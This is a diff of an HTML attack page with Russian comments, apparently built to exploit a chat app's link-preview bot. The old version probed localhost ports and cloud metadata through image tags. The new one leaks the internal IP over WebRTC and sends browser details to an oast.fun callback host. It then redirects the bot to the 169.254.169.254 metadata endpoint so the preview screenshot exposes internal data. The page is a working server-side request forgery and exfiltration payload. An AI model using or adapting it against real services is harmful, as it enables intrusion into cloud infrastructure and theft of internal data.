@@ -1,39 +1,35 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>Impact Search v4</title>
-</head>
+<head><title>Data Exfiltration</title></head>
 <body>
-    <script>
-        const oast = "http://esqbwjbyepcxrsacleqfj8d083r6aniqm.oast.fun";
+<script>
+    const oast = "http://esqbwjbyepcxrsacleqfj8d083r6aniqm.oast.fun";
 
-        // Функция-репортер
-        function report(path) {
-            var img = new Image();
-            img.src = oast + "/" + path + "?rand=" + Math.random();
-        }
+    // 1. Утечка внутреннего IP через WebRTC (Классика)
+    try {
+        var pc = new RTCPeerConnection({iceServers:[]});
+        pc.createDataChannel("");
+        pc.createOffer().then(offer => pc.setLocalDescription(offer));
+        pc.onicecandidate = (ice) => {
+            if (ice && ice.candidate && ice.candidate.candidate) {
+                var internalIP = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(ice.candidate.candidate)[1];
+                fetch(`${oast}/webrtc_leak_${internalIP}`);
+            }
+        };
+    } catch(e) { fetch(`${oast}/webrtc_failed`); }
 
-        // 1. Проверяем, жив ли сам JS в боте
-        report("js_is_alive");
+    // 2. Утечка характеристик системы
+    const info = btoa(`UA: ${navigator.userAgent}, Plat: ${navigator.platform}`);
+    fetch(`${oast}/sys_info?data=${info}`);
 
-        // 2. Сканируем внутренние порты через теги img
-        // Если порт открыт, сработает onload или хотя бы придет попытка запроса
-        const targets = [
-            { name: "localhost_80", url: "http://127.0.0.1:80/favicon.ico" },
-            { name: "localhost_8080", url: "http://127.0.0.1:8080/favicon.ico" },
-            { name: "cloud_metadata", url: "http://169.254.169.254/latest/meta-data/" },
-            { name: "internal_kittenx", url: "http://31.177.104.115:80/" }
-        ];
-
-        targets.forEach(target => {
-            var probe = new Image();
-            probe.onload = function() { report("OPEN_" + target.name); };
-            probe.onerror = function() { report("HIT_OR_CLOSED_" + target.name); };
-            probe.src = target.url;
-        });
-    </script>
-
-    <img src="http://127.0.0.1/forced_internal_hit">
-    <link rel="prefetch" href="http://169.254.169.254/latest/meta-data/">
+    // 3. ТРЮК ДЛЯ ПРЕВЬЮ (Чтобы увидеть "инфу" глазами в чате MAX)
+    // Мы ждем 2 секунды, чтобы скрипты выше отработали, 
+    // а затем редиректим бота на внутренний ресурс. 
+    // Бот сделает скриншот этого ресурса и покажет его ТЕБЕ в чате VK.
+    setTimeout(() => {
+        window.location.href = "http://169.254.169.254/latest/meta-data/hostname"; 
+        // или http://127.0.0.1/server-status
+    }, 2500);
+</script>
 </body>
 </html>
